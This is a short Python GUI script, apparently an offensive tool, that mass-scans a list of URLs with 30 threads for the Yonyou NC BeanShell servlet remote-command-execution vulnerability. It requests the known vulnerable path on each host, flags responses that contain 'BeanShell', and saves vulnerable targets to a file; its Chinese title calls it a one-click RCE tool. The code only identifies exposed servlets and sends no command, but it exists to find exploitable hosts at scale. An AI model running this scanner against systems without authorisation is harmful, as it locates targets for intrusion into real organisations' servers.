import requests
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def yync_exp(url):
    poc = r"""/servlet//~ic/bsh.servlet.BshServlet"""
    url = url + poc
    try:
        res = requests.get(url, timeout=3)
        if "BeanShell" in res.text:
            yync_rce_text.insert(END,"【*】存在漏洞的url：" + url + "\n")
            yync_rce_text.see(END)
            with open ("存在用友NC命令执行漏洞的url.txt", 'a') as f:
                f.write(url + "\n")
        else:
            yync_rce_text.insert(END, "【×】不存在漏洞的url：" + url + "\n")
            yync_rce_text.see(END)
    except Exception as err:
        yync_rce_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
        yync_rce_text.see(END)
def get_yync_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def yync_rce_gui():
    yync_rce = tk.Tk()
    yync_rce.geometry("910x450")
    yync_rce.title("用友 NC bsh.servlet.BshServlet 远程命令执行漏洞一把梭")
    yync_rce.resizable(0, 0)
    yync_rce.iconbitmap('logo.ico')
    global yync_rce_text
    yync_rce_text = scrolledtext.ScrolledText(yync_rce,width=123, height=25)
    yync_rce_text.grid(row=0, column=0, padx=10, pady=10)
    yync_rce_text.see(END)
    addrs = get_yync_addr()
    max_thread_num = 30
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(yync_exp, addr)
    yync_rce.mainloop()